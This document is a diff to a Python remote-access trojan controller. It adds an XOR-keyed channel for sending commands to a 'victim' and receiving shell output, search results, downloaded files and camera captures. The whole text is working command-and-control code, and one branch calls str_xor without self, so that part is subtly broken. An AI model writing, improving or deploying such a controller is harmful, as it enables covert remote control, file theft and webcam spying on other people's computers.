@@ -82,7 +82,12 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
         except KeyboardInterrupt:
             exit("\nEXIT")
         print("[+] New connection from " + str(address))
-        self.victim = self.r_recv()
+        self.key = self.r_recv()
+        self.victim = self.x_recv()
+
+
+    def str_xor(self, s1,s2):
+        return "".join([chr( ord(c1) ^ ord(c2) ) for (c1,c2) in zip(s1,s2)])
 
     def encrypt(self, msg):
         public_key = RSA.importKey(self.publickey)
@@ -96,17 +101,34 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
         dec = decryptor.decrypt(cipher)
         return dec.decode()
 
-    def r_send(self, msg):
-        msg = msg.encode()
-        encrypted = "".encode()
-        if(len(msg)>470):
-            for i in range(0,len(msg),470):
-                chunk = msg[0+i:470+i]
-                encrypted += self.encrypt(chunk)
-        else:
-            encrypted = self.encrypt(msg)
+    def x_send(self,msg):
+        encrypted = ""
+        if(len(msg)>1024):
+            for i in range(0,len(msg),1024):
+                chunk = msg[0+i:1024+i]
+                encrypted += str_xor(chunk,self.key)
+            encrypted = encrypted.encode()
+        else:  
+            encrypted = self.str_xor(msg, self.key).encode()
         encrypted += "done".encode()
         self.connection.send(encrypted)
+
+
+    def x_recv(self):
+        data = "".encode()
+        while not data.endswith("done".encode()):
+            data += self.connection.recv(MAX)
+        data = data[:-4]
+        data = data.decode()
+        decrypted = ""
+        if len(data)>1024:
+            for i in range(0,len(data),1024):
+                chunk = data[i+0:i+1024]
+                decrypted += self.str_xor(chunk,self.key)
+        else:
+            decrypted = self.str_xor(data,self.key)
+        return decrypted
+
         
     def r_recv(self):
         data = "".encode()
@@ -155,7 +177,7 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                 cmd = str(input("[" + self.victim + "]>> "))
                 if(len(cmd.strip())<1):
                     self.run()
-                self.r_send(cmd)
+                self.x_send(cmd)
                 cmd = cmd.split(' ')
                 if cmd[0] == "download":
                     filename = ' '.join(cmd[1:])
@@ -180,17 +202,17 @@ lgKFNB0WAhw9dYCLHW1wtjejOc+IaeCxdMf77NX7hO7YsJS1FIyohB1EAcXZTz7H
                     print("[+] caamera captured")
                     os.chdir("..")
                 elif cmd[0] == "search" and len(cmd)>1:
-                    res = self.r_recv()
+                    res = self.x_recv()
                     print(res)
                 elif cmd[0] == "clear" :
                     os.system("clear")
                 else:
-                    result = self.r_recv()
+                    result = self.x_recv()
                     print(result)
                     
 
             except KeyboardInterrupt:
-                self.r_send("terminate")
+                self.x_send("terminate")
                 self.connection.close()
                 exit("\nEXIT")
 
